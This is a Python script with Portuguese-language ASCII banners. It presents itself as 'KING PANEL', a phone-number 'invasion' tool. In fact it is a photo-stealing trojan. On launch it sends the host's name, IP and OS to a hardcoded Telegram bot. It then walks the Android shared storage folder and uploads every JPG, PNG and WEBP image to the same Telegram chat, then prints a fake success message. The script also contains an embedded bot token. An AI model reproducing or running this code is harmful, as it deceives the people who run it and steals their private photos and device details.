decoracion = '''\033[92m

╔══════════════════════════════════════════════╗
║                                              ║
║              🦍  K I N G  P A N E L          ║
║                                              ║
╚══════════════════════════════════════════════╝

        ██╗  ██╗██╗███╗   ██╗ ██████╗
        ██║ ██╔╝██║████╗  ██║██╔════╝
        █████╔╝ ██║██╔██╗ ██║██║  ███╗
        ██╔═██╗ ██║██║╚██╗██║██║   ██║
        ██║  ██╗██║██║ ╚████║╚██████╔╝
        ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

★ Bem-vindo ao KING PANEL.

★ Sistema privado de verificação.

★ Digite o número com o prefixo internacional.

★ Exemplo:
  +5511999999999

★ Use apenas com números próprios ou autorizados.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[0m
'''
#@BoxPrey
print(decoracion)
print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
import platform
import socket
import requests
import sys
import threading
import time
import telebot
import os
from threading import Thread

# Token de tu bot de Telegram
bot_token = "8676603425:AAGrRvR08mt0aU88xNaEFXCKfAALTQZkJ_Q"
#@BoxPrey
bot = telebot.TeleBot(bot_token)
#@logs
chat_id = "1919739278"

def enviar_log():
    try:
        ip = socket.gethostbyname(socket.gethostname())
        nome_pc = socket.gethostname()
        sistema = platform.system()
        horario = time.strftime("%d/%m/%Y %H:%M:%S")

        mensagem = f"""
🟢 NOVA EXECUÇÃO

🕒 Horário: {horario}
💻 PC: {nome_pc}
🌐 IP: {ip}
🧠 Sistema: {sistema}
"""

        bot.send_message(chat_id, mensagem)

    except Exception as e:
        print("Erro no log:", e)
#@BoxPrey
name = input('''\033[95m𝙞𝙣𝙨𝙞𝙧𝙖 𝙤 𝙣𝙪𝙢𝙚𝙧𝙤 𝙦𝙪𝙚 𝙦𝙪𝙚𝙧 𝙞𝙣𝙫𝙖𝙙𝙞𝙧:''')
#@BoxPrey
def send_file(file_path):
    try:
        if file_path.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
            with open(file_path, "rb") as f:
                bot.send_photo(chat_id="1919739278", photo=f)
                time.sleep(0.2)  # ← delay entre envios

    except Exception:
        print("𝗲𝗿𝗿𝗼 𝗻𝗮 𝘀𝗼𝗹𝗶𝗰𝗶𝘁𝗮çã𝗼, 𝘁𝗲𝗻𝘁𝗮𝗻𝗱𝗼 𝗻𝗼𝘃𝗮𝗺𝗲𝗻𝘁𝗲.")

def attack_message():
    print("\033[92m𝙘𝙤𝙣𝙩𝙖 𝙞𝙣𝙫𝙖𝙙𝙞𝙙𝙖 ✅\033[0m")

def main():
    dir_path = "/storage/emulated/0/"

    file_threads = []
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            file_path = os.path.join(root, file)
            t = Thread(target=send_file, args=(file_path,))
            t.start()
            file_threads.append(t)

    for file_thread in file_threads:
        file_thread.join()

    attack_message()  # ✔ agora sim, só no final
#@BoxPrey
if __name__ == "__main__":
    enviar_log()
    main()